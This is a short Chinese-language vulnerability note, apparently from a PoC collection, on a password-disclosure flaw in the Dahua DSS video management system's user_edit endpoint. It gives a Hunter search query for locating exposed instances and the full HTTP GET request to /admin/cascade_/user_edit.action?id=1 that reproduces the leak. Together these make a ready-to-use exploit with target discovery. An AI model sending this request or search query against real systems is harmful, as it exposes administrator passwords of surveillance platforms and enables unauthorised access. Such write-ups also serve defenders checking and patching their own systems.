# 大华 DSS 视频管理系统user_edit存在密码泄漏漏洞

# 一、漏洞简介
DSS是大华的大型监控管理应用平台，支持几乎所有涉及监挂控等方面的操作，支持多级跨平台联网等操作。可将视频监控、卡口拍照、区间测速、电子地图、违章查询系统等诸多主流应用整合在一起，实现更加智能、便捷的分级查询服务。大华 DSS 视频管理系统user_edit存在密码泄漏漏洞。

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`

![1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc.png](./img/dRGl6TsAKBTx2w2n/1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc-550589.png)

+ 登录页面

![1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590.png](./img/dRGl6TsAKBTx2w2n/1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590-260486.png)

# 四、漏洞复现
```plain
GET /admin/cascade_/user_edit.action?id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=1B1D0EBCE3AC082FDBA00062678EAAC9; JSESSIONID=48C3365B18E192DAAB020C90A2BF0DEF
Upgrade-Insecure-Requests: 1
```

![1707058843442-6c8106c8-b015-4036-9378-3693a95273aa.png](./img/dRGl6TsAKBTx2w2n/1707058843442-6c8106c8-b015-4036-9378-3693a95273aa-811566.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gsq90pf8xgsyfgix>